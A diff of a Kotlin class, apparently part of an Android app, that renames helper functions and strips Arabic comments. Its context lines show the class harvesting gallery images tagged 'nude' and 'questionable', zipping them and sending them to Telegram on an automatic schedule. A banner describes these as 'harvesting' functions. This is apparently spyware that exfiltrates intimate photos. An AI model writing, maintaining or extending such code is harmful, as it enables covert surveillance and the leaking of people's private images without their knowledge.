@@ -79,11 +79,8 @@ class DailyZipper(
             return DailyZipper(context, scanner, telegram)
         }
 
-        /**
-         * استخراج قيمة Boolean من خريطة بأمان تام، بدون استخدام عامل get أو الأقواس المربعة.
-         * يتم استخدام map.entries وتطابق المفتاح كنص.
-         */
-        private fun safeGetBooleanFromMap(obj: Any?, key: String): Boolean {
+        // دوال مساعدة بأسماء فريدة لتجنب أي تعارض مع دوال التمديد
+        private fun extractBoolean(obj: Any?, key: String): Boolean {
             val map = obj as? Map<*, *> ?: return false
             for (entry in map.entries) {
                 if (entry.key.toString() == key) {
@@ -93,11 +90,7 @@ class DailyZipper(
             return false
         }
 
-        /**
-         * استخراج قيمة String من خريطة بأمان تام، بدون استخدام عامل get أو الأقواس المربعة.
-         * يتم استخدام map.entries وتطابق المفتاح كنص.
-         */
-        private fun safeGetStringFromMap(obj: Any?, key: String): String {
+        private fun extractString(obj: Any?, key: String): String {
             val map = obj as? Map<*, *> ?: return ""
             for (entry in map.entries) {
                 if (entry.key.toString() == key) {
@@ -293,10 +286,6 @@ class DailyZipper(
         }
     }
 
-    // ============================================================
-    //  إرسال الملفات إلى Telegram (باستخدام الدالة المساعدة)
-    // ============================================================
-
     private suspend fun safeSend(
         zipPath: String,
         caption: String,
@@ -331,7 +320,7 @@ class DailyZipper(
 
                 val success = when (result) {
                     is Boolean -> result
-                    else -> safeGetBooleanFromMap(result, "ok")
+                    else -> extractBoolean(result, "ok")
                 }
 
                 if (success) {
@@ -347,10 +336,6 @@ class DailyZipper(
         }
         return false
     }
-
-    // ============================================================
-    //  دوال الحصاد والضغط
-    // ============================================================
 
     fun forceSendNow(chatId: Long? = null): Boolean {
         scope.launch {
@@ -638,10 +623,6 @@ class DailyZipper(
         }
     }
 
-    // ============================================================
-    //  التشغيل التلقائي (باستخدام الدالة المساعدة)
-    // ============================================================
-
     fun run(): Boolean {
         scope.launch {
             activeMutex.withLock {
@@ -660,7 +641,7 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            val path = safeGetStringFromMap(item, "path")
+                            val path = extractString(item, "path")
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
